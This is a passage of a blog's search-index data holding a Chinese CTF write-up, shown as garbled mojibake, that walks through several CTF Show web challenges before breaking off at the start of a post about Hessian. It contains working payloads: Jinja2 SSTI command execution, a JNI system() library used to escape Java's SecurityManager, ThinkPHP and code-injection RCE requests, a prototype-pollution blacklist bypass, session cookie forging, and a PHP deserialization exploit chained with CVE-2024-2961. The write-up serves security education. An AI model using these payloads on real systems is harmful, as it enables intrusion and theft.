payload æ‹¿åˆ° flagï¼š\nself['__in''it__']['__glo''bals__']['__buil''tins__']['__imp''ort__']('os').popen('ca''t /flag').read() ezzz_ssti Jinja2 SSTIï¼Œä½†æ˜¯é™åˆ¶äº† payload çš„é•¿åº¦\nç»•è¿‡é•¿åº¦é™åˆ¶å¯ä»¥å‚è€ƒï¼šhttps://blog.csdn.net/weixin_43995419/article/details/126811287\nFlask ä¸­æœ‰ä¸€ä¸ªå…¨å±€å¯¹è±¡ configï¼Œæ˜¯ä¸€ä¸ªç»§æ‰¿äºå­—å…¸çš„æ•°æ®ç±»ï¼Œç”¨æ¥ä¿å­˜ä¸€äº›é…ç½®ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡å®ƒçš„ update æ–¹æ³•å°†ä»»æ„å¯¹è±¡è®¾ç½®åˆ° config çš„å±æ€§ä¸­ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†è¿‡é•¿çš„ payload åˆ†æ®µä¿å­˜åˆ° config ä¸­ï¼Œå¹¶è®¾ç½®ä¸€ä¸ªå¾ˆçŸ­çš„å±æ€§åï¼Œä»¥æ­¤æ¥ç»•è¿‡é•¿åº¦é™åˆ¶\nbypassï¼š\n{{config.update(c=config.update)}} {{config.update(g=\u0026quot;__globals__\u0026quot;)}} {{config.c(f=lipsum[config.g])}} {{config.c(o=config.f.os)}} {{config.c(p=config.o.popen)}} {{config.p(\u0026quot;cat /f*\u0026quot;).read()}} ç®€å•çš„æ–‡ä»¶ä¸Šä¼  ä¸Šä¼ ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„ jar åŒ…å¹¶æ‰§è¡Œï¼Œä¼šå¾—åˆ°ä»¥ä¸‹å¼‚å¸¸ä¿¡æ¯ï¼š\nException in thread \u0026quot;main\u0026quot; java.security.AccessControlException: access denied (\u0026quot;java.io.FilePermission\u0026quot; \u0026quot;\u0026lt;\u0026gt;\u0026quot; \u0026quot;execute\u0026quot;) at java.security.AccessControlContext.checkPermission(AccessControlContext.java:472) at java.security.AccessController.checkPermission(AccessController.java:884) at java.lang.SecurityManager.checkPermission(SecurityManager.java:549) at java.lang.SecurityManager.checkExec(SecurityManager.java:799) at java.lang.ProcessBuilder.start(ProcessBuilder.java:1018) at java.lang.Runtime.exec(Runtime.java:620) at java.lang.Runtime.exec(Runtime.java:450) at java.lang.Runtime.exec(Runtime.java:347) at org.example.Main.main(Main.java:5) é‚£ä¹ˆæ˜¾ç„¶è¿™é¢˜çš„è€ƒç‚¹æ˜¯ç»•è¿‡ Security Managerï¼Œç»è¿‡å°è¯•åå¯ä»¥é€šè¿‡ JNI æ¥ç»•è¿‡ï¼Œç»†èŠ‚å‚è€ƒï¼šhttps://www.anquanke.com/post/id/151398#h3-8\né¢˜ç›®è¿˜æœ‰ä¸¤ä¸ªéœ€è¦å¤„ç†çš„åœ°æ–¹ï¼š\nåªèƒ½ä¸Šä¼  jar æ–‡ä»¶ï¼Œæ‰€ä»¥è¦å°†å…±äº«é“¾æ¥åº“çš„åç¼€æ”¹ä¸€ä¸‹ï¼Œå¹¶ä¸å½±å“ä½¿ç”¨ å¾—çŸ¥é“ä¸Šä¼ ç›®å½•çš„ä½ç½®æ˜¯ /var/www/html/uploads å°†ä»¥ä¸‹ä¸¤ä¸ª Java æ–‡ä»¶ç¼–è¯‘æˆ jar åŒ…\npackage org.example; public class Main { public static void main(String[] args) throws Exception { NativeCall.exec(\u0026quot;cat /secretFlag000.txt\u0026quot;); } } package org.example; public class NativeCall { static { System.load(\u0026quot;/var/www/html/uploads/libNativeCall.jar\u0026quot;); } public native static String exec(String cmd); } æˆ‘æ˜¯ç›´æ¥ä½¿ç”¨ maven æ‰“åŒ…ï¼Œæ‰€ä»¥è¦åœ¨ pom.xml ä¸­æ·»åŠ é…ç½®\n\u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;!-- Build an executable JAR --\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-jar-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;archive\u0026gt; \u0026lt;manifest\u0026gt; \u0026lt;mainClass\u0026gt;org.example.Main\u0026lt;/mainClass\u0026gt; \u0026lt;/manifest\u0026gt; \u0026lt;/archive\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; ç„¶åæ˜¯å°†æ¶æ„ C ä»£ç ç¼–è¯‘æˆå…±äº«é“¾æ¥åº“\n#include \u0026quot;NativeCall.h\u0026quot; #include\u0026lt;stdlib.h\u0026gt; #ifdef __cplusplus extern \u0026quot;C\u0026quot; { #endif JNIEXPORT jstring JNICALL Java_org_example_NativeCall_exec( JNIEnv *env, jclass cls, jstring j_str) { const char *c_str = NULL; char buff[128] = { 0 }; c_str = (*env)-\u0026gt;GetStringUTFChars(env, j_str, NULL); if (c_str == NULL) { printf(\u0026quot;out of memory.n\u0026quot;); return NULL; } system(c_str); // execute command (*env)-\u0026gt;ReleaseStringUTFChars(env, j_str, c_str); return (*env)-\u0026gt;NewStringUTF(env, buff); } #ifdef __cplusplus } #endif é¦–å…ˆè¦ç”Ÿæˆ NativeCall ç±»çš„å¤´æ–‡ä»¶ï¼Œç„¶åç”¨ gcc ç¼–è¯‘å…±äº«é“¾æ¥åº“\n# 1. ç¼–è¯‘ NativeCall.class javac src/main/java/org/example/NativeCall.java -d bin # 2. ç”Ÿæˆå¤´æ–‡ä»¶ NativeCall.h javah -jni -classpath ./bin -o NativeCall.h org.example.NativeCall # 3. ç¼–è¯‘å…±äº«é“¾æ¥åº“ï¼Œä»¥ jar ä¸ºåç¼€ gcc -I$JAVA_HOME/include -I$JAVA_HOME/include/linux -fPIC -shared NativeCall.c -o libNativeCall.jar å°†ä¸¤ä¸ª jar æ–‡ä»¶éƒ½ä¸Šä¼ åç›´æ¥æ‰§è¡Œå°±èƒ½è¯»åˆ° flag\nè¥¿ç“œæ¯ å¥¹è¯´å¥¹æƒ³ç»“å©š é™„ä»¶æ˜¯å‘¨å¤„é™¤ä¸‰å®³çš„æˆªå›¾\nèµ·æ‰‹ binwalk+foremost æ‹¿åˆ°è—åœ¨å›¾ç‰‡é‡Œçš„å‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…ç”¨äº†ä¼ªåŠ å¯†ï¼Œç”¨ 010Editor æœ deFlags å°†æ‰€æœ‰ 9 æ”¹æˆ 0 å³å¯è§£å‹å¾—åˆ°ä¸€å † txt æ–‡ä»¶\nâ¯ eza -l --time-style full-iso .rwxr-xr-x 0 zrquan 2011-08-28 16:28:27.000000000 +0800 0.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:28:21.000000000 +0800 1.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:28:41.000000000 +0800 2.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:27:38.000000000 +0800 3.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:28:19.000000000 +0800 4.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:28:36.000000000 +0800 5.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:28:22.000000000 +0800 6.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:28:03.000000000 +0800 7.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:28:24.000000000 +0800 8.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:27:28.000000000 +0800 9.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:28:39.000000000 +0800 10.txt .rwxr-xr-x 22k zrquan 2024-06-22 00:52:12.752078000 +0800 flag.txt .rwxr-xr-x 0 zrquan 2012-05-20 13:14:52.000000000 +0800 tips.txt é™¤äº† flag.txt æœ‰ä¸€å †æ„ä¹‰ä¸æ˜çš„ä¸­æ–‡æ–‡æœ¬ï¼Œå…¶ä»–æ–‡ä»¶éƒ½æ˜¯ç©ºçš„ï¼Œä½†æ˜¯æ˜æ˜¾æ—¶é—´è¢«åŠ¨è¿‡æ‰‹è„šï¼Œç‰¹åˆ«æ˜¯ tips.txt çš„ä¿®æ”¹æ—¶é—´çœ‹åˆ° 5201314\né¦–å…ˆçœ‹ flag.txtï¼Œç”¨ bat çœ‹ä¸€ä¸‹å†…å®¹\nä»æœ«å°¾çš„ä¸€å †ç©ºç™½å­—ç¬¦å¯ä»¥æƒ³åˆ° SNOW éšå†™ï¼Œè€Œä¸”é¢˜ç›®æç¤ºäº†å›¾ç‰‡ä¸­é™ˆæ¡‚æ—çš„å°è¯æ˜¯æŸä¸ª keyï¼Œé‚£ä¹ˆæŠŠå°è¯ä½œä¸º password ç”¨ SNOW è§£å¯† flag.txt å°±å¯ä»¥æ‹¿åˆ°å‰åŠä¸ª flag\nå†å›åˆ°å‰©ä¸‹çš„ txt æ–‡ä»¶ï¼Œä¹‹å‰å‘ç°å®ƒä»¬çš„æ—¶é—´æœ‰è¹Šè··ï¼Œé‚£ä¹ˆæ£€æŸ¥ä¸€ä¸‹å®ƒä»¬çš„æ—¶é—´æˆ³\nâ¯ eza -l --time-style '+%s' .rwxr-xr-x 0 zrquan 1314520107 0.txt .rwxr-xr-x 0 zrquan 1314520101 1.txt .rwxr-xr-x 0 zrquan 1314520121 2.txt .rwxr-xr-x 0 zrquan 1314520058 3.txt .rwxr-xr-x 0 zrquan 1314520099 4.txt .rwxr-xr-x 0 zrquan 1314520116 5.txt .rwxr-xr-x 0 zrquan 1314520102 6.txt .rwxr-xr-x 0 zrquan 1314520083 7.txt .rwxr-xr-x 0 zrquan 1314520104 8.txt .rwxr-xr-x 0 zrquan 1314520048 9.txt .rwxr-xr-x 0 zrquan 1314520119 10.txt .rwxr-xr-x 22k zrquan 1718988732 flag.txt .rwxr-xr-x 0 zrquan 1337490892 tips.txt å‘ç°æ—¶é—´æˆ³éƒ½æ˜¯ä»¥ 1314520 å¼€å¤´ï¼Œè€Œä¸”å‰©ä¸‹çš„æ•°å­—éƒ½ ascii ç è¡¨å†…ï¼Œæˆ‘ä»¬å°è¯•å°†å…¶æå–å‡ºæ¥è§£ç \nresult = \u0026quot;\u0026quot; for i in [107,101,121,58,99,116,102,83,104,48,119]: result += chr(i) print(result) # key:ctfSh0w åˆæ‹¿åˆ°ä¸€ä¸ª keyï¼Œç”¨åœ¨å“ªé‡Œå‘¢ï¼ŸåŸæ¥æœ€åˆçš„ flag.png ä¸­è¿˜è—äº†ä¸œè¥¿ï¼Œä¸‹å›¾ä¸­ 9E97BA2A æ˜¯ OurSecret åŠ å¯†çš„ç‰¹å¾ã€‚OurSecret æ˜¯ä¸€ä¸ªæ–‡æ¡£åŠ å¯†å·¥å…·ï¼Œå¯ä»¥å°†ä¸€äº›ç§å¯†æ–‡ä»¶éšè—åœ¨å…¶ä»–æ–‡ä»¶é‡Œï¼Œéœ€è¦é€šè¿‡å¯†ç æ¥æå–ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ª key\nç›´æ¥ç”¨ OurSecret æ‰“å¼€ flag.png ä¼šè¯†åˆ«ä¸åˆ°é‡Œé¢çš„åŠ å¯†æ•°æ®ï¼Œéœ€è¦å°†åé¢ zip æ–‡ä»¶çš„æ•°æ®(504B0304 å¼€å¤´)å…ˆåˆ é™¤ï¼Œç„¶åæ‹¿åˆ°ä»¥ä¸‹æ–‡æœ¬ï¼š\nJRDEWV2JKIZUKR2KJBCVGWKTJBGEUVSWIVGVIWKHIJGFOWKXJJLE2UK2IVKVES2WJZFEYR2RKZKDES22GJLFKM2DIZEEMSKGINIEUNI= ç”¨ CyberChef çš„ Magic æ¨¡å—ç›´æ¥è§£å‡º flag\nBase32 -\u0026gt; Base32 -\u0026gt; Base64 -\u0026gt; Base64 æœ€åå¾—åˆ°ï¼šctfshow{W1sh1ng_every0ne_4_happy_time_pl4ying}\nä½ æ˜¯æˆ‘çš„çœ¼ åç¼–è¯‘ jar ç„¶åå®¡è®¡ Main.java\npublic class Main { private static final String PART1 = \u0026quot;U2NF9CSUFOTUF9\u0026quot;; private static final String PART2 = \u0026quot;Xw-\u0026quot;; private static final String PART3 = \u0026quot;Q1RGU2hvd3tURVNUX0\u0026quot;; private static final String PART4 = \u0026quot;JBU0\u0026quot;; public static String customDecode(String input) { String standardInput = input.replace('-', '+').replace('_', '/'); return new String(Base64.getDecoder().decode(standardInput)); } public static void main(String[] args) { Scanner scanner = new Scanner(System.in); System.out.println(\u0026quot;è¯·è¾“å…¥FLAG:\u0026quot;); String userInput = scanner.nextLine(); String flag = \u0026quot;Q1RGU2hvd3tURVNUX0JBU0U2NF9CSUFOTUF9Xw-\u0026quot;; String decodedFlag = customDecode(flag); String cleanInput = userInput.replace(\u0026quot;_\u0026quot;, \u0026quot;\u0026quot;).replace(\u0026quot;\\u000f\u0026quot;, \u0026quot;\u0026quot;); if (checkflag(cleanInput, decodedFlag)) { System.out.println(\u0026quot;flagæ­£ç¡®\u0026quot;); } else { System.out.println(\u0026quot;è¾“å…¥é”™è¯¯\u0026quot;); } scanner.close(); } private static boolean checkflag(String input, String CTFflag) { return CTFflag.replace(\u0026quot;_\u0026quot;, \u0026quot;\u0026quot;).replace(\u0026quot;\\u000f\u0026quot;, \u0026quot;\u0026quot;).equals(input); } } å®˜æ–¹ wp ä¸­å‡ºé¢˜çš„æ€è·¯åº”è¯¥æ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼Œä½†å…¶å®ç›´æ¥ base64 è§£ç  flag å˜é‡å°±å®Œäº‹äº†\u0026hellip;\nâ¯ echo 'Q1RGU2hvd3tURVNUX0JBU0U2NF9CSUFOTUF9Xw-' | base64 -d CTFShow{TEST_BASE64_BIANMA}_base64: invalid input æäº¤ CTFShow{TEST_BASE64_BIANMA}\nCodeInject ç­¾åˆ°é¢˜ï¼Œç›´æ¥æ‰§è¡Œä»£ç \nhttp --verify no -f https://2db56ea5-d48e-469f-ae42-194cc9bd7a06.challenge.ctf.show/ 1=\u0026quot;system('cat /000f1ag.txt')\u0026quot; tpdoor é¢˜ç›®æä¾›çš„ä»£ç å¾ˆæœ‰é™ï¼ŒåªçŸ¥é“å¯ä»¥é€šè¿‡ isCache å‚æ•°æ§åˆ¶ request_cache_key é…ç½®é¡¹\nå…ˆé€šè¿‡è·¯ç”±é”™è¯¯ç¡®è®¤ ThinkPHP çš„ç‰ˆæœ¬ä¸º V8.0.3\nhttps://acf3a4dd-e196-4d00-ba5a-4443ee775efb.challenge.ctf.show/?s=foo ç„¶åéœ€è¦å®¡è®¡ä¸€ä¸‹ ThinkPHP æºç ï¼Œæ—¢ç„¶å¯ä»¥æ§åˆ¶ç¼“å­˜æœºåˆ¶çš„ keyï¼Œé¢˜ç›®ä»£ç ä¸­ä¹Ÿå¯ç”¨äº†æ£€æŸ¥ç¼“å­˜çš„ä¸­é—´ä»¶ CheckRequestCacheï¼Œå°±ä»å®ƒå…¥æ‰‹\nå®¡è®¡ä»£ç å¯ä»¥å‘ç°æ¼æ´å­˜åœ¨äº parseCacheKey æ–¹æ³•ï¼ŒL152 ä»¥ | åˆ†å‰² keyï¼Œç„¶åå°†åé¢éƒ¨åˆ†èµ‹å€¼ç»™ $fun ã€‚ä¹‹åæ²¡æœ‰ç»è¿‡ä»»ä½•å®‰å…¨è¿‡æ»¤ï¼Œåœ¨ L178 æŠŠ $fun ä½œä¸ºå‡½æ•°æ‰§è¡Œï¼Œè€Œå‚æ•°å°±æ˜¯åˆ†å‰²åçš„å‰é¢éƒ¨åˆ†\nso\nhttp -b bd7550d8-af8b-4361-9bad-e169fd8ec931.challenge.ctf.show isCache=='ls /|system' cacheTime==5 http -b bd7550d8-af8b-4361-9bad-e169fd8ec931.challenge.ctf.show isCache=='cat /000f1ag.txt|system' cacheTime==5 tips å¦‚æœä½ å·²ç»è§¦å‘äº†ç¼“å­˜è€Œä¸”æ²¡è®¾ç½® cacheTimeï¼Œé‡å¯å®¹å™¨å§ï¼Œä¸ç„¶ä¸€ä¸ªå°æ—¶åæ‰ä¼šåˆ·æ–°ç¼“å­˜ æ‹¿ä¸åˆ°ç»“æœå¯ä»¥å¤šåˆ·æ–°å‡ æ¬¡é¡µé¢ easy_polluted Python çš„åŸå‹æ±¡æŸ“ï¼Œéœ€è¦ç»•è¿‡é»‘åå•ï¼Œè€Œä¸”é»‘åå•ä¸­æœ‰ä¸‹åˆ’çº¿ï¼Œä¼°è®¡å°±æ˜¯ç¼–ç ç»•è¿‡äº†\ndef filter(user_input): blacklisted_patterns = ['init', 'global', 'env', 'app', '_', 'string'] for pattern in blacklisted_patterns: if re.search(pattern, user_input, re.IGNORECASE): return True return False å®¡è®¡ä»£ç å¯ä»¥çœ‹åˆ°ä¼šå…ˆç”¨ filter å‡½æ•°æ£€æŸ¥é»‘åå•ï¼Œç„¶åç”¨ json.loads è§£æ JSON æ•°æ®ï¼Œè€ŒæŒ‰ç…§ JSON çš„è§„èŒƒï¼Œé‡åˆ° \\u å¼€å¤´çš„ unicode è½¬ä¹‰åºåˆ—æ˜¯ä¼šè‡ªåŠ¨è§£ææˆ unicode å­—ç¬¦çš„\n@app.route('/',methods=['POST']) def index(): username = request.form.get('username') password = request.form.get('password') session[\u0026quot;username\u0026quot;] = username session[\u0026quot;password\u0026quot;] = password Evil = evil() if request.data: if filter(str(request.data)): return \u0026quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~\u0026quot; else: merge(json.loads(request.data), Evil) return \u0026quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED\u0026quot; return render_template(\u0026quot;index.html\u0026quot;) @app.route('/admin',methods=['POST', 'GET']) def templates(): username = session.get(\u0026quot;username\u0026quot;, None) password = session.get(\u0026quot;password\u0026quot;, None) if username and password: if username == \u0026quot;adminer\u0026quot; and password == app.secret_key: return render_template(\u0026quot;flag.html\u0026quot;, flag=open(\u0026quot;/flag\u0026quot;, \u0026quot;rt\u0026quot;).read()) else: return \u0026quot;Unauthorized\u0026quot; else: return f'Hello, This is the POLLUTED page.' å¦å¤–ï¼Œflag.html ä¸­ç”¨çš„å¹¶ä¸æ˜¯ jinja çš„é»˜è®¤è¯­æ³•\n\u0026lt;body\u0026gt; è¿™åˆæ˜¯ä»€ä¹ˆjinjaè¯­æ³•å•Šï¼ [#flag#] \u0026lt;/body\u0026gt; æ‰€ä»¥éœ€è¦ä»¥ä¸‹å‡ æ­¥æ¥æ‹¿ flag\né€šè¿‡åŸå‹æ±¡æŸ“ä¿®æ”¹ SECRET_KEY\né€šè¿‡åŸå‹æ±¡æŸ“ä¿®æ”¹ jinja_envï¼Œä»¥ä¿®æ”¹å¼•ç”¨å˜é‡çš„è¯­æ³•\nç”¨ unicode è½¬ä¹‰åºåˆ—ç»•è¿‡é»‘åå•æ£€æŸ¥\n{\u0026quot;\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f\u0026quot;: {\u0026quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f\u0026quot;: {\u0026quot;\\u0061\\u0070\\u0070\u0026quot;: {\u0026quot;config\u0026quot;: {\u0026quot;SECRET\\u005fKEY\u0026quot;: \u0026quot;ctfshow\u0026quot;}, \u0026quot;\\u006a\\u0069\\u006e\\u006a\\u0061\\u005f\\u0065\\u006e\\u0076\u0026quot;: {\u0026quot;\\u0076\\u0061\\u0072\\u0069\\u0061\\u0062\\u006c\\u0065\\u005f\\u0073\\u0074\\u0061\\u0072\\u0074\\u005f\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\u0026quot;: \u0026quot;[#\u0026quot;,\u0026quot;\\u0076\\u0061\\u0072\\u0069\\u0061\\u0062\\u006c\\u0065\\u005f\\u0065\\u006e\\u0064\\u005f\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\u0026quot;: \u0026quot;#]\u0026quot;}}}}} ä½¿ç”¨å’Œ SECRET_KEY ç›¸åŒçš„å¯†ç ç™»å½•ä¼šè¯ï¼Œè®¿é—® /admin\nflask-unsign --cookie \u0026quot;{'password': 'ctfshow', 'username': 'adminer'}\u0026quot; --secret ctfshow --sign Ezzz_php \u0026lt;?php highlight_file(__FILE__); error_reporting(0); function substrstr($data) { $start = mb_strpos($data, \u0026quot;[\u0026quot;); $end = mb_strpos($data, \u0026quot;]\u0026quot;); return mb_substr($data, $start + 1, $end - 1 - $start); } class read_file{ public $start; public $filename=\u0026quot;/etc/passwd\u0026quot;; public function __construct($start){ $this-\u0026gt;start=$start; } public function __destruct(){ if($this-\u0026gt;start == \u0026quot;gxngxngxn\u0026quot;){ echo 'What you are reading is:'.file_get_contents($this-\u0026gt;filename); } } } if(isset($_GET['start'])){ $readfile = new read_file($_GET['start']); $read=isset($_GET['read'])?$_GET['read']:\u0026quot;I_want_to_Read_flag\u0026quot;; if(preg_match(\u0026quot;/\\[|\\]/i\u0026quot;, $_GET['read'])){ die(\u0026quot;NONONO!!!\u0026quot;); } $ctf = substrstr($read.\u0026quot;[\u0026quot;.serialize($readfile).\u0026quot;]\u0026quot;); unserialize($ctf); }else{ echo \u0026quot;Start_Funny_CTF!!!\u0026quot;; } Start_Funny_CTF!!! æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„æ˜¯ start å’Œ read ä¸¤ä¸ªè¯·æ±‚å‚æ•°ï¼Œä½† start çš„ä½œç”¨ä¸å¤§ï¼Œéœ€è¦æƒ³åŠæ³•é€šè¿‡ read å‚æ•°å°† read_file çš„åºåˆ—åŒ–å­—ç¬¦ä¸²èµ‹å€¼ç»™ $ctf ä»¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–\nèµ‹å€¼ $ctf å˜é‡å‰ä¼šé€šè¿‡ substrstr æå–ä¸­æ‹¬å·å†…çš„å­å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ payload è¦æ”¾åˆ°ä¸­æ‹¬å·é‡Œé¢(?read=[payload])ï¼Œä½†ä¸­æ‹¬å·åˆè¢«è¿‡æ»¤äº†ï¼Œéœ€è¦æƒ³åŠæ³•ç»•è¿‡\nä»è¿™ç¯‡æ–‡ç« å¯ä»¥äº†è§£åˆ° PHP çš„ mb_strpos å’Œ mb_substr å‡½æ•°åœ¨å¤„ç† UTF-8 å‰å¯¼å­—èŠ‚ f0 ï¼ˆæ„å‘³ç€å­—ç¬¦é•¿åº¦ä¸ºå››ä¸ªå­—èŠ‚ï¼‰æ—¶æœ‰ä¸€ç‚¹åŒºåˆ«ï¼Œæ€»ç»“ä¸€ä¸‹æœ‰ä»¥ä¸‹ä¸‰ç‚¹ï¼š\nmb_substr é‡åˆ° f0 æ—¶ä¼šç›´æ¥æŠŠå®ƒå’Œæ¥ç€çš„ 3 ä¸ªå­—èŠ‚å½“ä½œä¸€ä¸ªç¼–ç å­—ç¬¦ï¼Œå³ä½¿åé¢çš„å­—èŠ‚ä¸ç¬¦åˆ UTF-8 ç¼–ç \nmb_strpos é‡åˆ° f0 ä¼šç»§ç»­è¯»å–åç»­å­—èŠ‚ï¼Œç›´åˆ°è¯»å–å®Œæ•´çš„å››å­—èŠ‚çš„ç¼–ç å­—ç¬¦ï¼Œå¦‚æœé‡åˆ°ä¸ç¬¦åˆç¼–ç çš„å­—èŠ‚ï¼Œå°±ä¼šæŠŠå‰é¢çš„å­—èŠ‚å½“æˆä¸€ä¸ªç¼–ç å­—ç¬¦\nmb_strpos é‡åˆ°ä¸­é—´å­—èŠ‚ 9f ä¼šç›´æ¥è·³è¿‡ï¼Œè€Œ mb_substr ä¸ä¼šï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœå…ˆé€šè¿‡ mb_strpos å®šä½æŸä¸ªå­—ç¬¦å†ç”¨ mb_substr æˆªå–ï¼Œåœ¨å‰é¢æ·»åŠ  9f ä¼šå¯¼è‡´æˆªå–æ—¶çš„ index æ¯”å®é™…ä¸Šçš„ index è¦é å‰\nåˆ©ç”¨ä»¥ä¸Šç¬¬ä¸‰ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€  payload ä½¿å¾— substrstr æå–åˆ°ä¸­æ‹¬å·å·¦ä¾§çš„å­—ç¬¦ä¸²ï¼Œåˆšå¥½ $read æ˜¯æ‹¼æ¥åˆ°ä¸­æ‹¬å·å‰é¢ï¼ˆå·¦ä¾§ï¼‰ï¼Œé‚£ä¹ˆå°±ä¸éœ€è¦åœ¨ payload ä¸­åŠ ä¸­æ‹¬å·äº†ï¼Œåˆ©ç”¨ 9f æŠŠæˆªå–ç»“æœåç§»åˆ° payload ä¸Šå°±å¥½äº†\nâš ï¸ è¿™ä¸ª bug åœ¨ PHP 8.3 ä¿®äº†ï¼Œæœ¬åœ°æµ‹è¯•æ—¶æ³¨æ„è¦ç”¨æ—§ç‰ˆæœ¬\néœ€è¦å‘å·¦åç§»å‡ ä¸ªå­—èŠ‚é•¿åº¦ï¼Œå°±åœ¨å‰é¢åŠ å‡ ä¸ª 9f å­—èŠ‚ï¼Œè¿˜è¦å¤šåç§»ä¸€ä¸ªå­—èŠ‚ä»£æ›¿ [ ï¼ŒåŒæ—¶è¦ä¿è¯ä¸­æ‹¬å·å†…çš„å­—ç¬¦ä¸²é•¿åº¦å’Œå·¦ä¾§çš„ payload é•¿åº¦ä¸€è‡´\néªŒè¯ä¸€ä¸‹è¯»å– /proc/self/cmdline\n/?start=gxngxngxnaaaaaa\u0026amp;read=%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9fO%3a9%3a\u0026quot;read_file\u0026quot;%3a2%3a{s%3a5%3a\u0026quot;start\u0026quot;%3bs%3a9%3a\u0026quot;gxngxngxn\u0026quot;%3bs%3a8%3a\u0026quot;filename\u0026quot;%3bs%3a18%3a\u0026quot;/proc/self/cmdline\u0026quot;%3b} å°è¯•äº†ä¸€ä¸‹å‘ç° flag ä¸æ˜¯å¸¸è§„ä½ç½®ï¼Œè¿˜éœ€è¦è¿›ä¸€æ­¥åˆ©ç”¨\nCVE-2024-2961 å¯ä»¥å°† PHP çš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å‡çº§ä¸ºå‘½ä»¤æ‰§è¡Œï¼Œæœ‰ç°æˆçš„ expï¼Œä¿®æ”¹ä¸€ä¸‹ Remote çš„æ–¹æ³•å³å¯\nclass Remote: ... def send(self, path: str) -\u0026gt; Response: \u0026quot;\u0026quot;\u0026quot;Sends given `path` to the HTTP server. Returns the response. \u0026quot;\u0026quot;\u0026quot; payload = f'O:9:\u0026quot;read_file\u0026quot;:2:{{s:5:\u0026quot;start\u0026quot;;s:9:\u0026quot;gxngxngxn\u0026quot;;s:8:\u0026quot;filename\u0026quot;;s:{len(path)}:\u0026quot;{path}\u0026quot;;}}' return self.session.get( self.url, params=urllib.parse.urlencode( { \u0026quot;start\u0026quot;: f\u0026quot;{'a'*(len(payload)-74)}\u0026quot;, \u0026quot;read\u0026quot;: f\u0026quot;{'%9f'*(len(payload) + 1)}{payload}\u0026quot;, }, safe=\u0026quot;%\u0026quot;, ), # proxies={ # \u0026quot;http\u0026quot;: \u0026quot;http://localhost:8080\u0026quot;, # \u0026quot;https\u0026quot;: \u0026quot;http://localhost:8080\u0026quot;, # }, ) def download(self, path: str) -\u0026gt; bytes: \u0026quot;\u0026quot;\u0026quot;Returns the contents of a remote file. \u0026quot;\u0026quot;\u0026quot; path = f\u0026quot;php://filter/convert.base64-encode/resource={path}\u0026quot; response = self.send(path) data = response.re.search(b\u0026quot;What you are reading is:(.*)\u0026quot;, flags=re.S).group(1) return base64.decode(data) ./cnext-exploit.py http://2f8a3833-8e81-4d3d-a99d-1d9c0d1cf7ad.challenge.ctf.show/ 'cat /must_rCE_F1nd_This_flag \u0026gt; /var/www/html/flag.txt' [TODO] NewerFileDetector Magika æ˜¯è°·æ­Œæ¨å‡ºçš„ä¸€æ¬¾æ–°å‹ AI æ–‡ä»¶ç±»å‹æ£€æµ‹å·¥å…·ï¼Œæ®è¯´ Magika çš„å‡†ç¡®ç‡å’Œå¬å›ç‡è¾¾åˆ° 99% ä»¥ä¸Šã€‚çœ‹ æ¥å¼€å‘å†ä¹Ÿä¸éœ€è¦æ‹…å¿ƒæ–‡ä»¶ä¸Šä¼ æ¼æ´äº†ã€‚\næœªå®ŒæŒç»­\u0026hellip;","date":"2024-12-24","permalink":"https://zrquan.github.io/posts/ctf-show/","tags":["ctf","writeup"],"title":"CTF Show åˆ·é¢˜è®°å½•"},{"content":"Hessian æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶ Web åè®®çš„å®ç°ï¼Œç”± caucho å…¬å¸ä¸»å¯¼å¼€å‘ï¼Œå…¶ç›®çš„æ˜¯å®ç°ä¸€ä¸ªè½»é‡çº§ã€è·¨è¯­è¨€ã€è‡ªæè¿°ï¼ˆä¸ä¾èµ–å¤–éƒ¨å®šä¹‰ï¼‰çš„äºŒè¿›åˆ¶é€šä¿¡åè®®\nHello Hessian Hessian åŸºäº HTTP è¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œä¸€èˆ¬ä¼šåƒå¸¸è§„çš„ Web æœåŠ¡ä¸€æ ·æä¾›ä¸€ä¸ª API 